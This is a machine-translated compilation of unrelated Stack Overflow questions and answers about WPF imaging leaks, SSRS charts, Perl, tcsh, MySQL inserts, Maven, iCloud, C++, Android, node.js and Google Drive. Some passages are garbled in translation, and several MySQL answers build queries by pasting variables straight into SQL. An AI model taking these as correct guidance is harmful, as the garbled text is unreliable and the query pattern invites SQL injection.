该错误**仅**在我们使用 JpegBitmapDecoder 添加元数据时发生。换句话说，如果任务只是对位图图像进行编码并将其保存到文件中，则不会出现任何问题。使用 Process Explorer、Process Monitor 或其他诊断工具时，没有发现任何明显的问题。根本没有观察到线程、内存或句柄泄漏。当出现此类错误时，将无法启动新的应用程序，例如记事本、word 等。一旦我们的应用程序终止，一切都会恢复正常。

LongRunning 的任务创建选项在 MSDN 中定义为*指定任务将是长时间运行的粗粒度操作。它向 TaskScheduler 提供了一个提示，表明可能需要超额订阅。*这意味着选择运行任务的线程可能不是来自 ThreadPool，也就是说，它是为任务目的而创建的。其他任务创建选项将导致为任务选择 ThreadPool 线程。

经过一段时间的分析和测试，我们将任务创建选项更改为*LongRunning*以外的任何选项，例如*PreferFairness*。根本没有对代码进行其他更改。这“解决”了问题，即不再出现存储空间不足的错误。

我们对 LongRunning 线程成为罪魁祸首的真正原因感到困惑。以下是我们对此的一些问题：

1.  为什么选择执行任务的线程应该来自线程池？如果线程终止，它的资源是否应该随着时间的推移被 GC 回收并返回给操作系统，而不管其来源如何？

2.  LongRunning 任务和导致错误的 JpegBitmapDecoder 功能的组合有什么特别之处？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-27T19:02:00.507

[命名空间中的](http://msdn.microsoft.com/en-us/library/ms741870.aspx)类`System.Windows.Media.Imaging`基于[线程架构](http://msdn.microsoft.com/en-us/library/ms741870.aspx)。无论好坏，默认行为的一部分是每当某些组件通过静态属性请求当前调度程序时，在任何正在执行的线程上启动一个新的。这意味着为线程启动了整个 Dispatcher “运行时”，并分配了各种资源，如果没有正确清理，将导致托管泄漏。“运行时”还期望其执行的线程是具有标准消息泵送的 STA 线程，并且默认情况下，运行时不启动 STA 线程。[`Dispatcher`](http://msdn.microsoft.com/en-us/library/ms741870.aspx)`Dispatcher``Dispatcher.Current``Dispatcher``Task`

那么，说了这么多，为什么会发生 LongRunning 而不是“常规”基于 ThreadPool 的线程？原因 LongRunning 意味着您每次都在启动一个新线程，这意味着每次都有新的 Dispatcher 资源。最终，如果您让默认任务调度程序（基于 ThreadPool 的调度程序）运行足够长的时间，它也会耗尽空间，因为没有任何东西可以为`Dispatcher`运行时泵送消息以便能够清理它需要的东西。

因此，如果您想使用`Dispatcher`这样的基于 -thread 的类，您确实需要使用旨在在正确管理“运行时”`TaskScheduler`的线程池上运行此类工作的自定义来执行此操作。`Dispatcher`好消息是你很幸运，因为我已经写了一篇[你可以在这里获取的](http://gist.github.com/drub0y/5681496)。FWIW，我在每天处理数十万张图像的三个非常大量的生产代码部分中使用了这个实现。

**实施更新**

我最近再次更新了实现，使其与`async`.NET 4.5 的新功能兼容。最初的实现与这个概念不合作，`SynchronizationContext`因为它不是必须的。现在您可能`await`在 Dispatcher 线程上执行的方法中使用 C# 中的关键字，我需要能够与之合作。在这种情况下，以前的实现会死锁，而最新的实现不会。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-30T11:17:05.740

在从 Uri 构造 BitmapSource 对象时，我可以自己重现并修复此问题。与您一样，它仅在 TaskCreationOptions.LongRunning 时发生。

为了避免在这种特殊情况下发生泄漏，我发现您可以在实例化所需的 WPF 对象后立即关闭 Dispatcher。

这是我对 TaskProc 的工作实现：

```
private static BitmapImage TaskProc()
{
    var result = new BitmapImage(new Uri(@"c:\test.jpg"));
    // the following line fixes the problem, no more leaks occur
    result.Dispatcher.InvokeShutdown();
    return result;
} 
```

# charts - SSRS BIDS 簇状堆积条形图

> ID：12624871
> 
> 赞同：0
> 
> 时间：2012-09-27T15:26:35.413
> 
> 标签：charts, reporting-services, bids

有没有办法在 BIDS 中创建一个图表来结合这些图表的属性

像这样的水平堆积条形图： [http://www.google.com/imgres?start=230&hl=en&sa=X&biw=1920&bih=1061&addh=36&tbm=isch&prmd=imvns&tbnid=0EL4x7-sHuCIyM:&imgrefurl=http://www。 phplot.com/phplotdocs/ex-horizstackedbar.html&docid=iqqzU8FDMbnIAM&imgurl=http://www.phplot.com/phplotdocs/examples/horizstackedbar.png&w=800&h=500&ei=U21kUJ_3JaTq0gH2yoDACw&zoom=1&iact=hc&vpx=1172&vpy=771&dur=7&vw866 284&tx=234&ty=158&sig=114547920454640352262&page=6&tbnh=134&tbnw=215&ndsp=47&ved=1t:429,r:44,s:230,i:296](http://www.google.com/imgres?start=230&hl=en&sa=X&biw=1920&bih=1061&addh=36&tbm=isch&prmd=imvns&tbnid=0EL4x7-sHuCIyM:&imgrefurl=http://www.phplot.com/phplotdocs/ex-horizstackedbar.html&docid=iqqzU8FDMbnIAM&imgurl=http://www.phplot.com/phplotdocs/examples/horizstackedbar.png&w=800&h=500&ei=U21kUJ_3JaTq0gH2yoDACw&zoom=1&iact=hc&vpx=1172&vpy=771&dur=3864&hovh=177&hovw=284&tx=234&ty=158&sig=114547920454640352262&page=6&tbnh=134&tbnw=215&ndsp=47&ved=1t:429,r:44,s:230,i:296)

和这样的水平条形图：http: [//msdn.microsoft.com/en-us/library/cc281302%28v=sql.105%29.aspx](http://msdn.microsoft.com/en-us/library/cc281302%28v=sql.105%29.aspx)

创建一个堆叠和聚集/分组的图表？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T09:12:05.677

假设您有一个包含以下列的数据集：员工、产品、总销售额、月份

*   创建堆积柱形图。
*   在 Values 选项上输入 Sum(Total Sales)
*   在系列组上放产品
*   在类别组上放置月份（这将是您的集群 - 您的第二张图片）
*   在类别组中，在月份下方放置员工（这将是您的详细信息 - 您的第一张图片）

# perl - Perl Image::Magic Watermark 错误

> ID：12624875
> 
> 赞同：0
> 
> 时间：2012-09-27T15:26:58.640
> 
> 标签：perl, imagemagick, cgi

我正在尝试使用 Image::Magic 为图像添加水印，机器人我不断收到此错误

```
Can't call method "Read" on an undefined value at ImageUploader.pl line xxx. 
```

女巫是：

```
$Logo->Read('../Data/Images/Watermark.png'); 
```

在下面的代码中，无法弄清楚路径是否正确并且文件存在。

有任何想法吗？

```
use Image::Magick;

my $NewImage = Image::Magick->new;
$NewImage->Read("../Data/Temp/Images/$SaveAs$Extension");

my ($Width,$Height) = $NewImage->Get('width','height'); # find dimensions

my $ResizedWidth = 275;
my $ResizedHeight = 450;

my $MeduimThumbnailWidth = 300;
my $MeduimThumbnailHeight = 300;

if($Height >= $ResizedHeight){
my $ResizedHeight = int($Height * ($ResizedWidth / $Width));

$Logo->Read('../Data/Images/Watermark.png');
$NewImage->Composite(compose=>'blend', blend=>'50x50', x=>'50', y=>'50', image=>$Logo,);

$NewImage->Resize(width=>$ResizedWidth, height=>$ResizedHeight);
$NewImage->Write("../Data/Images/$URL/$SaveAs\_lrg$Extension");
}else{
$NewImage->Write("../Data/Images/$URL/$SaveAs\_lrg$Extension");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:35:30.683

`$Logo`是未定义的，因为您从未为其赋值。

大概你错过了：

```
my $Logo = Image::Magick->new(); 
```

您还缺少：

```
use strict;
use warnings; 
```

… 它应该出现在所有现代 Perl 程序中。

# tcsh - Retrieve the last field in a string containing '/' as delimiter using tsch script

> ID：12624878
> 
> 赞同：0
> 
> 时间：2012-09-27T15:27:15.523
> 
> 标签：tcsh

I have writen a tcsh script. I have a file name and its path in a variable. For example : proj/debug/runs/filename This path can be of any length. I need just the file name at the end. Is there any way to split this string and retrieve the file name?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T14:41:58.357

如果您的路径存储在 shell 变量中，例如`$p`，那么`t`修饰符将执行您想要的操作：

```
% set filepath = /one/two/thee/four
% echo $filepath:t
four 
```

或者，您可以使用该`basename`命令。

# php - MySQL : Insert Exactly Same Data Multiple Rows Without PHP Loop

> ID：12624882
> 
> 赞同：1
> 
> 时间：2012-09-27T15:27:28.880
> 
> 标签：php, mysql

I need to insert same data to my MySQL table without having PHP loop. The reason why I'm doing this is that because I have a column with Auto_Increment feature and that column associates with other table.

So, I just need to insert some *exactly same* data and it's multiple rows (dynamic) but by using single INSERT syntax below :

```
INSERT INTO outbox_multipart (TextDecoded) VALUES ('$SMSMessage') 
```

how to have this single INSERT syntax, but produce n number of rows?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:28:49.310

你可以这样做：

```
INSERT INTO outbox_multipart (TextDecoded) VALUES ('$SMSMessage')
, ('$SMSMessage2'), ('$SMSMessage3'), ('$SMSMessage4'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:30:06.693

尝试这样的事情

```
 $sql = mysql_query("INSERT INTO outbox_multipart (TextDecoded) VALUES ('$SMSMessage')
      , ('$SMSMessage'),('$SMSMessage'),('$SMSMessage')"); 
```

此外，正如您所知，`mysql_*`已被弃用。因此，尝试使用 mysqli_* 或 PDO 进行查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:28:33.597

```
INSERT INTO outbox_multipart (TextDecoded) VALUES ('$SMSMessage'),('$SMSMessage')
,('$SMSMessage'),('$SMSMessage') 
```

如果动态完成，

```
$n=5;
for ($i=0;$i<$n;$i++){$values.="('$SMSMessage'),";}
$values=substr($values,0,-1); 
```

而 SQL 是：

```
INSERT INTO outbox_multipart (TextDecoded) VALUES $values 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-27T09:34:23.797

假设您想要 3 次插入，只需这样做：

```
INSERT INTO outbox_multipart (TextDecoded) VALUES ('$SMSMessage'),('$SMSMessage'),('$SMSMessage'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:37:35.550

```
mysql_query("INSERT INTO `table`(`this`) VALUES (`that`); INSERT INTO `table`(`this`) VALUES (`that`);"); 
```

# java - Maven依赖顺序

> ID：12624892
> 
> 赞同：19
> 
> 时间：2012-09-27T15:27:53.490
> 
> 标签：java, maven, jar

在我的项目中有一个实现接口的类。该接口来自依赖项。我有另一个依赖项，它本身依赖于一个也包含相同接口的 jar，除了具有更多方法的版本；包含相同包接口的两个 jar 没有相同的 groupId 或 artifactId。
编译失败，因为编译器抱怨我项目中的类没有实现所有方法。我意识到这是因为编译器从错误的 jar 中获取接口引用。我的问题是，*为什么 maven 使用传递依赖项中的接口，而不是我在项目 POM 中明确提到的 jar 中的接口？*我可以看到使用的 jar 出现在定义的前面（所以我也想象在类路径中），但我认为在这些情况下，maven 通过使用**最短路径的依赖项中的冲突类/接口来解决它**

这是依赖关系树的一部分。*请注意，这是 grepped*，但仍然可以看出（实际使用的）与（应该使用的）`javax.servlet:servlet-api`相比在树中更深`tomcat:servlet`

```
[builder@ca-rd-build11 proj]$ mvn dependency:tree | grep servlet
[INFO] |  +- javax.servlet:servlet-api:jar:2.4:compile
[INFO] +- tomcat:servlet:jar:4.0.6:compile 
```

我正在使用 Maven 3.0.4

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-27T15:47:20.697

> 为什么 maven 使用传递依赖项中的接口，而不是我在项目 POM 中明确提到的 jar 中的接口？

因为，对 Maven 来说，这两者没有任何关系。Maven 不知道类或包名，Maven 只知道 groupId 和 artifactId。由于它们不一样，maven 没有任何理由忽略传递依赖。

如果我是正确的，Maven 会将依赖项按照定义的顺序放置在类路径上，即依赖项的传递依赖项`a`出现在依赖项之前`b`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-27T15:44:49.570

当您声明对另一个 jar 文件的依赖时，您可以告诉它排除对冲突 jar 文件的传递依赖：

```
 <dependency>
        <groupId>group</groupId>
        <artifactId>artifact</artifactId>
        <version>1.0.0</version>
        <exclusions>
            <exclusion>
                <groupId>othergroup</groupId>
                <artifactId>ArtifactToExclude</artifactId>
            </exclusion>
        </exclusions>
    </dependency> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-10-05T01:02:12.907

*对于未来的访问者*（因为标题是通用的）：

在 Maven 中，您有两类依赖项：

*   [**（外部）依赖项**](http://maven.apache.org/guides/getting-started/index.html#How_do_I_use_external_dependencies)：您在*pom.xml*文件`<dependencies>`
*   [**传递依赖**](http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Transitive_Dependencies)项：你的*pom.xml*依赖项需要的依赖项（自动包含，连同它们的依赖项，等等）

根据官方 Maven[文档](http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html) ，当遇到多个版本作为依赖项时，将应用以下中介：

> Maven 选择**“最近的定义”**。也就是说，它使用依赖关系树中与您的项目最接近的依赖关系的版本。您始终可以通过在项目的 POM 中明确声明来保证版本。请注意，如果两个依赖版本在依赖树中的深度相同，则第一个声明获胜。
> 
> *示例*：如果 A、B 和 C 的依赖项定义为 A -> B -> C -> D 2.0 和 A -> E -> D 1.0，则构建 A 时将使用 D 1.0，因为从 A 到的路径D 到 E 更短。您可以在 A 中显式添加对 D 2.0 的依赖项以强制使用 D 2.0。

在上面的例子中，A 是实际的项目，B 和 E 是在其*pom.xml*文件中定义的外部依赖，C 和 D 是传递依赖。

# cordova - Phonegap 2.1：iOS 上的自定义推送通知文本订阅

> ID：12624893
> 
> 赞同：0
> 
> 时间：2012-09-27T15:28:02.537
> 
> 标签：cordova, push-notification

我在带有 jquerymobile 的 iOS 应用程序上使用 phonegap 的“推送通知”插件。

在第一次启动时，通知会询问用户是否希望收到我的应用程序的“推送通知”。是否可以自定义此文本？

接受第一个“订阅通知”后，如果我删除设备的应用程序并将其放回，则不会向用户询问“订阅通知”。当用户删除我的应用程序并将其放回时，如何再次显示此“订阅通知”？

谢谢你的帮助。

# iphone - 我可以在 iCloud 中存储 c++ 二进制文件吗？

> ID：12624894
> 
> 赞同：0
> 
> 时间：2012-09-27T15:28:05.720
> 
> 标签：iphone, c++, objective-c, ios, icloud

我有一个主要用 C++ 编写的 ios 游戏，它以标准的 C++ 二进制格式存储其游戏数据。我想添加 iCloud 支持，但我不确定是否可以将此类文件上传到 iCloud。

是否可以？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:29:57.647

为什么不？应用程序的 Documents 文件夹中的任何文件都将备份到 iCloud。

如果这个文件不能以其他方式重新创建（例如它是一个保存游戏，而不是一个缓存文件），那么我认为没有问题。

该文档指出：

> 将用户数据放在 /Documents/ 中。用户数据是您的应用程序无法重新创建的任何数据，例如用户文档和其他用户生成的内容。

...

> 位于 Documents 子目录（或其子目录之一）中的每个文件或文件包都作为一个单独的文档呈现给用户（通过 OS X 和 iOS 中的 iCloud UI），可以单独删除。

（[http://developer.apple.com/library/ios/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUIde/FileSystemOverview/FileSystemOverview.html](http://developer.apple.com/library/ios/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/FileSystemOverview/FileSystemOverview.html)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:01:20.513

您的应用程序或游戏的 iCloud 文档可以具有您想要的任何内部格式 - 您不必使用 NSDocument 类。

请注意，iCloud 备份与 iCloud 文档不同。将用户数据放入 Documents 文件夹将导致它作为设备备份的一部分备​​份到 iCloud，但不会导致它同步到其他设备。为此，您需要使用[iCloud API](http://developer.apple.com/library/ios/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/iCloud/iCloud.html#//apple_ref/doc/uid/TP40010672-CH12-SW47)来正确协调同步过程。

您可以保存将被视为单个项目的非特定数据，也可以保存用户可以删除的“文档”，例如，当空间不足时。您可以通过单击 iCloud 首选项中的“管理”来查看其工作原理。

如果您需要存储的数据不是太大（几千字节），我建议您也查看[键值存储](https://developer.apple.com/library/ios/#documentation/General/Conceptual/iCloudDesignGuide/Chapters/DesigningForKey-ValueDataIniCloud.html#//apple_ref/doc/uid/TP40012094-CH7-SW9)，它比文档 API 简单得多。可以使用 NSData 将二进制数据存储在那里。键值存储的限制最近已提高到 1MB 和 1024 个键。

# c++ - 用户定义的哈希表，其值为函数指针

> ID：12624897
> 
> 赞同：-3
> 
> 时间：2012-09-27T15:28:14.977
> 
> 标签：c++, data-structures, hash

下面是我
创建哈希表的代码，其中键为 Char*，值作为函数指针

```
// hash1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <iostream> 
#include <cstdlib> 
#include <cstring> 
#include <iomanip> 
#define SIZE_KEY       16 
#define SIZE_VALUE1    64 
#define SIZE_VALUE2    16 
#define DEFAULT_TABLESIZE    101 
using namespace std; 
typedef void (*FunctionPtr)(); 
typedef void (*FunctionPtr1)(); 
void (*FunctionPtr2)(); 

  void ping(){
    cout<<"hello";
  }
  void refresh(){
    cout<<"refresh";
  }

typedef struct NODE 
{ 
   NODE(char* Key1,FunctionPtr func_ptr) 
   { 

      strcpy_s(Key,Key1);
      FunctionPtr1 func_ptr1;
      func_ptr1=func_ptr;

      next = NULL; 
   } 
   NODE(){
   }
    char Key[SIZE_KEY]; 
    FunctionPtr1 func_ptr1[SIZE_VALUE1]; 
    NODE *next; 
}; 

class Hashtable 
{ 
   private: 
      int table_size; 
      NODE** table; 
      int size; 
      long hashString(char* Key);
      NODE* find(char* Key); 
      NODE* current_entry; 
   public: 
      int current_index; 
      Hashtable(int T = DEFAULT_TABLESIZE);//constructor 
      virtual ~Hashtable();//destructor 
      bool put(NODE *); 
      bool get(NODE *); 
      bool contains(char* Key); 
      void removeAll(); 
      int getSize(); 
      void initIterator(); 
      bool hasNext(); 
      void getNextKey(char* Key); 
      friend void disp(NODE *); 
}; 

Hashtable::Hashtable(int T) 
{ 
   size = 0; 
   table_size = T; 
   table = new NODE*[table_size]; 
   for(int i=0; i<table_size; i++) 
   { 
      table[i] = NULL; 
   } 
} 

Hashtable::~Hashtable() 
{ 
   removeAll(); 
   delete[] table; 
} 

bool Hashtable::put(NODE *N) 
{//start put 
   if(find(N->Key) != NULL) 
   { 
      return false; 
   } 
   //NODE* entry = new NODE( N->Key ,*(FunctionPtr *)N->func_ptr1 );
   NODE* entry = new NODE( N->Key ,*(FunctionPtr *)N->func_ptr1 );
   int bucket = hashString(N->Key); 
   entry->next = table[bucket]; 
   table[bucket] = entry; 
   size++; 
   return true; 
}//end put 

bool Hashtable::get(NODE* N) 
{//start get 
   NODE* temp = find(N->Key); 
   if(temp == NULL) 
   { 
       *(FunctionPtr *)N->func_ptr1 = refresh; 
      return false; 
   } 
   else
   { 
    *(FunctionPtr *)N->func_ptr1= *(FunctionPtr *)temp->func_ptr1;

      return true; 
   } 
}//end get 

bool Hashtable::contains(char* Key) 
{//start contains 
   if(find(Key) == NULL) 
   { 
      return false; 
   } 
   else
   { 
      return true; 
   } 
}//end contains 

void Hashtable::removeAll() 
{//start removeAll 
   for(int i=0; i<table_size; i++) 
   { 
      NODE* temp = table[i]; 
      while(temp != NULL) 
      { 
         NODE* next = temp->next; 
         disp(temp); 
         delete temp; 
         temp = next; 
      } 
   } 
   size = 0; 
}//end removeAll 

int Hashtable::getSize() 
{ 
   return size; 
} 

NODE* Hashtable::find(char* Key) 
{ //start find 
   int bucket = hashString(Key); 
   NODE* temp = table[bucket]; 
   while(temp != NULL) 
   { 
      if(strcmp(Key, temp->Key) == 0) 
      { 
         return temp; 
      } 
      temp = temp->next; 
   } 
   return NULL; 
}//end find 

long Hashtable::hashString(char* Key) 
{//start hashString 
   int n = strlen(Key); 
   long h = 0; 
   for(int i=0; i<n; i++) 
   { 
      //To get almost fair distributions of NODEs over the array 
      h = (h << 3) ^ Key[i]; 
   } 
    return abs(h % table_size ); 
}//end hashString 

void Hashtable::initIterator() 
{//start initIterator 
   current_entry = NULL; 
   current_index = table_size; 
   for(int i=0; i<table_size; i++) 
   { 
      if(table[i] == NULL) 
      { 
          continue; 
      } 
      else
      { 
         current_entry = table[i]; 
         current_index = i; 
         break; 
      } 
   } 
}//end initIterator 

bool Hashtable::hasNext() 
{ 
   if(current_entry == NULL) 
   { 
      return false; 
   } 
   else
   { 
      return true; 
   } 
} 
void Hashtable::getNextKey(char* Key) 
{ 
   if(current_entry == NULL) 
   { 
      Key[0] = '\0'; 
      return; 
   } 
   strcpy(Key, current_entry->Key); 
   if(current_entry->next != NULL) 
   { 
      current_entry = current_entry->next; 
   } 
   else
   { 
     for(int i=current_index+1; i<table_size; i++) 
     { 
        if(table[i] == NULL) 
        { 
           continue; 
        } 
        current_entry = table[i]; 
        current_index = i; 
        return; 
     } 
     current_entry = NULL; 
     current_index = table_size; 
   } 
} 

void dispAll(Hashtable* hashtable); 

int main() 
{ 
   char temp1[SIZE_KEY]; 
   Hashtable* hashtable = new Hashtable(); 

   NODE N1("1",ping); 
   if(!hashtable->contains(N1.Key)) 
   { 
      cout << "\nAdding NODE:  "; 
      disp(&N1); 
      hashtable->put(&N1); 
   } 
 //  dispAll(hashtable);

   strcpy(N1.Key, "314"); 
    *(FunctionPtr *) N1.func_ptr1=refresh;

   if(!hashtable->contains(N1.Key)) 
   { 
      cout << "\nAdding NODE:  "; 
      disp(&N1); 
      hashtable->put(&N1); 
   } 

 /*  strcpy(N1.Key, "320"); 
    *(FunctionPtr *) N1.func_ptr1= ping; 

   if(!hashtable->contains(N1.Key)) 
   { 
      cout << "\nAdding NODE:  "; 
      disp(&N1); 
      hashtable->put(&N1); 
   } 

   strcpy(N1.Key, "768"); 
   *(FunctionPtr *)N1.func_ptr1= refresh; 
   if(!hashtable->contains(N1.Key)) 
   { 
      cout << "\nAdding node:  "; 
      disp(&N1); 
      hashtable->put(&N1); 
   } 

   strcpy(N1.Key, "756"); 
 *(FunctionPtr *) N1.func_ptr1= refresh;

   if(!hashtable->contains(N1.Key)) 
   { 
      cout << "\nAdding node:  "; 
      disp(&N1); 
      hashtable->put(&N1); 
   } */

   dispAll(hashtable); 

   // strcpy(temp1,"314"); 
  // hashtable->remove(temp1); 
  // cout << "\n\nAfter removing 314:" << endl; 
 //  dispAll(hashtable); 
   cout << "\n\nDestroying hashtable:" << endl; 
   delete hashtable; 
   return 0; 
} 

void disp(NODE *N1) 
{ 
 cout << "\nKey:      " << N1->Key << "\nFunction "
      << N1->func_ptr1 << endl; 
// FunctionPtr2();
} 

void dispAll(Hashtable *hashtable) 
{ 
    NODE N1; 
    cout << "\n\nCurrent nodes in hashtable:" << endl; 
    hashtable->initIterator(); 
    while(hashtable->hasNext()) 
    { 
        //cout<<"Current Index === "<<hashtable->current_index;
        hashtable->getNextKey(N1.Key); 
        hashtable->get(&N1); 
        disp(&N1); 
    } 
} 
```

每次将数据写入哈希表 VALUE 包含相同的地址 :( 我想要我将发送的特定函数的地址..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T16:44:55.550

有些问题可能在`struct NODE`.

```
typedef struct NODE 
{ 
   NODE(char* Key1,FunctionPtr func_ptr) 
   { 
      strcpy_s(Key,Key1);
      FunctionPtr1 func_ptr1; // <-- Problem may be here
      func_ptr1=func_ptr;

      next = NULL; 
   } 
   NODE(){
   }

   char Key[SIZE_KEY]; 
   FunctionPtr1 func_ptr1[SIZE_VALUE1];  // <-- And here
   NODE *next; 
}; 
```

您声明了一个本地`func_ptr1`in `NODE::NODE(char*, FunctionPtr)`，并将参数分配`func_ptr`给`func_ptr1`. 因此，`func_ptr`被分配给一个*局部*变量，而不是一个成员变量。而且，一旦构造函数返回，函数指针就不会被记住。
另一个问题：为什么是`NODE::func_ptr1`一个*数组*`FunctionPtr1`？我不认为您打算在一个`NODE`实例中存储多个函数指针。

# android - 如何样式化android默认组件

> ID：12624900
> 
> 赞同：1
> 
> 时间：2012-09-27T15:28:25.083
> 
> 标签：android, android-alertdialog, progressdialog

我的应用程序一启动，就会`AsyncTask`检索一个 JSON。在下载它时，我像往常一样显示一个进度对话框：

```
protected void onPreExecute() {
    Context c = ((EventoMainActivity)mCallback);
    mDialog = new ProgressDialog(c, R.style.my_Dialog);
    mDialog.setTitle("Descargando datos del evento ");
    mDialog.setMessage("Espere un instante...");
    mDialog.setIndeterminate(true);
    mDialog.show();
} 
```

当我想自定义对话框时，我将我的样式传递给构造函数以更改颜色等，实现以下结果：

![在此处输入图像描述](../Images/65b3bf85a67f8d1cddad5ca91fdb75bb.png)

（有些样式来自 Widget.Sherlock.Light.ProgressBar 的继承）

到现在为止还挺好。使用颜色文本属性，我将其更改为红色，但这就是我所能做的。***问题是我想为标题文本、消息文本和蓝色线条赋予样式。***

我的方法是*在 android 源代码（它们的布局 xml 文件）中寻找这些元素的结构*。我发现progressDialog来自alertDialog。在那里我找到了定义标题参数和消息参数的结构：

```
From alert_dialog.xml
...
<com.android.internal.widget.DialogTitle android:id="@+id/alertTitle"
                style="?android:attr/textAppearanceLarge"
                android:singleLine="true"
                android:ellipsize="end"
                android:layout_width="match_parent"
                android:layout_height="wrap_content" />
...

From progress_dialog.xml
...    
<TextView android:id="@+id/message"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical" />
... 
```

问题是它**`android.R.id`不包含对这些 ID 的引用，**因此我无法在代码中访问此视图`findByID`并将我希望的样式应用于它们。

我知道如何进行自定义布局，但***我想知道是否有某种方法可以设置默认组件的样式***。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:38:54.020

您可以使用包装器，您可以在其中为当前上下文中的任何内容设置主题（样式）。您可以将 R.style.MyTheme 设置为警报对话框的样式，并根据自己的喜好自定义该视图。

```
ContextThemeWrapper ctw = new ContextThemeWrapper( this, R.style.MyTheme );
AlertDialog.Builder builder= new AlertDialog.Builder( ctw ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T10:09:55.703

经过一段时间的研究，我认为这是不可能的。默认组件的样式使用您的应用程序无法访问的 id，这使得它不可行，除非您创建自己的自定义组件。

# javascript - node.js 中的 require(../) 是如何工作的？

> ID：12624901
> 
> 赞同：3
> 
> 时间：2012-09-27T15:28:26.997
> 
> 标签：javascript, node.js

node.js 在遇到 var foo=require(../) 时会寻找哪些模块？

看起来它会从当前目录向上查找目录，但它究竟会查找和执行什么操作？

**也许与 C 中的include**或Python中的**import**有一个类比？

我一直从 node.js 开始阅读 [http://nodejs.org/api/modules.html](http://nodejs.org/api/modules.html) 并在 github 上找到了示例代码，例如

```
var express = require('express')
  , tracker = require('../') 
```

这段代码似乎在使用 npm 安装 express 后分配 express 模块（文件）的变量*express*内容，其路径必须是全局的，这似乎可以理解，虽然我知道有两种类型的模块安装，但这是另一个问题。

*但是变量跟踪器*分配了哪些内容？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-27T15:37:14.863

这取决于该目录中的内容。

**如果 X 以 './' 或 '/' 或 '../' 开头**：

一种。LOAD_AS_FILE(Y + X)
b. LOAD_AS_DIRECTORY(Y + X)

**加载_AS_FILE（X）：**

1.  如果 X 是文件，则将 X 作为 JavaScript 文本加载。停止
2.  如果 X.js 是文件，则将 X.js 作为 JavaScript 文本加载。停止
3.  如果 X.node 是一个文件，则将 X.node 作为二进制插件加载。停止

**加载_AS_DIRECTORY（X）：**

1.  如果 X/package.json 是一个文件，
    a. 解析 X/package.json，并查找“main”字段。
    湾。让 M = X + (json main field)
    c. **LOAD_AS_FILE(M)**
2.  如果 X/index.js 是文件，则将 X/index.js 作为 JavaScript 文本加载。停止
3.  如果 X/index.node 是一个文件，则将 X/index.node 作为二进制插件加载。停止

# android - 如何在 eclipse 上安装 Google 驱动 SDK、google-http-java-client 或至少在 eclipse 项目中使用它

> ID：12624905
> 
> 赞同：0
> 
> 时间：2012-09-27T15:28:34.750
> 
> 标签：android, eclipse, installation, google-drive-api

我需要一步一步安装列表，read me html 没用

这就是我尝试过的

我从这里下载了 API 测试版：

[http://code.google.com/p/google-http-java-client/wiki/Setup#google-http-client-android2](http://code.google.com/p/google-http-java-client/wiki/Setup#google-http-client-android2)

然后我尝试将 android 相关的 jar 文件 [来自同一个链接] 转移到项目 libs 文件夹中

然后我尝试了这个例子

[https://developers.google.com/drive/manage-downloads](https://developers.google.com/drive/manage-downloads)

前两个导入有效，但存在某种依赖性问题。

导入 com.google.api.client.http.GenericUrl；导入 com.google.api.client.http.HttpResponse；

不支持后两个导入

导入 com.google.api.services.drive.Drive；导入 com.google.api.services.drive.model.File；

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T17:03:55.140

尝试将 Google Play 服务添加到构建路径。

你可以这样做

开放 SDK 浏览至 EXTRAS 并安装 Google Play 服务 ![http://i1279.photobucket.com/albums/y522/Vnge/GooglePlayServices_zps2241497e.png](../Images/048571d0fc0d56e7a39e4f4339c39883.png)

然后你会想去项目-> 属性-> JAVA BUILD PATH 点击添加外部 JARS -> 浏览到你的 android-sdk 文件夹所在的位置 浏览到 \extras\google\google_play_services\libproject\google-play-service_lib\libs

然后点击 Order and Export 然后点击 Google Play Services Jar

# silverlight-4.0 - Silverlight 中的列表框和组合框数据绑定

> ID：12624906
> 
> 赞同：-1
> 
> 时间：2012-09-27T15:28:37.383
> 
> 标签：silverlight-4.0

我正在尝试使用实验室提供[http://www.silverlight.net/learn/data-networking/binding/silverlight-data-binding](http://www.silverlight.net/learn/data-networking/binding/silverlight-data-binding)来实施和学习 Silverlight 数据绑定。我会尽快在实验室中做所有事情，但有些方法，我无法将项目过滤到列表框中，即使我能够在列表框中看到项目。此外，当我选择列表框中的任何项目时，它不会使用公共类进行绑定在文本框中显示文本，但是当我使用列表框进行元素绑定时，它会在文本框中显示文本。

我仔细检查了实验室中给出的代码，一切看起来都很相似，但我无法让数据绑定工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T18:02:21.797

检查您的 DataContext 是否正确。检查 表示可能有拼写错误。否则很难在没有看到它的情况下说出你的代码中的错误是什么。

# hosting - 使用 sql ce 5 在 discountasp.net 上托管 Web 应用程序

> ID：12624908
> 
> 赞同：0
> 
> 时间：2012-09-27T15:28:40.443
> 
> 标签：hosting, sql-server-ce, discountasp

